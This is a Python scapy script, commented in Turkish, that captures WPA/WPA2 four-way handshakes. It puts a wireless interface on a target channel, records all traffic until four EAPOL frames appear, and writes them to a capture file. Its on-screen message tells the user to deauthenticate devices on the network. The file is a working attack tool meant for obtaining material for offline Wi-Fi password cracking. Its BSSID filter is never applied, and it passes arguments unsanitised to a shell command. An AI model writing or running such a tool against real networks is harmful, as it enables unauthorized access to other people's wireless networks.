import argparse
from scapy.all import *
import os

eapol_packets = []
all_packets = []
waiting_message_printed = False
handshake_completed = False

def packet_handler(pkt, bssid, file_name):
    global eapol_packets, all_packets, handshake_completed, waiting_message_printed

    # Tüm paketleri saklayın
    all_packets.append(pkt)
    
    # Sadece EAPOL mesajlarını alıyoruz
    if pkt.haslayer(EAPOL):
        if pkt not in eapol_packets:
            eapol_packets.append(pkt)
            print(f"[+] EAPOL paketi yakalandı ({len(eapol_packets)}/4)")
        
        # Eğer 4 EAPOL paketi yakalandıysa handshake tamamlandı
        if len(eapol_packets) == 4:
            print(f"[+] Tüm handshake paketleri ({len(eapol_packets)}/4) yakalandı!")
            handshake_completed = True  # Handshake tamamlandı
            # Paketleri dosyaya bir kez kaydet
            wrpcap(file_name, all_packets, append=False)
            print(f"[+] Tüm paketler {file_name} olarak kaydedildi!")
            return True  # Handshake bulunduğu için döngüyü sonlandır

def start_sniffing(interface, bssid, channel):
    global waiting_message_printed
    
    # Kanala geçiş yap
    print(f"[+] {interface} arayüzü {channel}. kanala geçirildi.")
    os.system(f"iwconfig {interface} channel {channel}")
    
    file_name = "packets.cap"
    
    if not waiting_message_printed:
        print("[*] Handshake bekleniyor... Lütfen cihazlara deauthentication atak yapınız yada ağdan düşüp tekrar bağlanmalarını sağlayınız.")
        waiting_message_printed = True
    
    # Sniff işlemi başlat
    sniff(iface=interface, prn=lambda x: packet_handler(x, bssid, file_name), store=0, stop_filter=lambda x: handshake_completed)

    # Ctrl+C (program kapatılınca)
    if handshake_completed:
        print("[+] Program kapatılıyor...")
    else:
        print("[*] Handshake bulunamadı, program sonlandırılıyor...")

def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 handshake yakalama aracı")
    parser.add_argument('--i', required=True, help='Kullanılacak ağ arayüzü (örneğin: wlan0mon)')
    parser.add_argument('--bssid', required=True, help='Hedef BSSID (örneğin: 00:11:22:33:44:55)')
    parser.add_argument('--channel', required=True, help='Hedef kanal numarası (örneğin: 6)')
    
    args = parser.parse_args()
    
    interface = args.i
    bssid = args.bssid
    channel = args.channel
    
    start_sniffing(interface, bssid, channel)

if __name__ == "__main__":
    main()
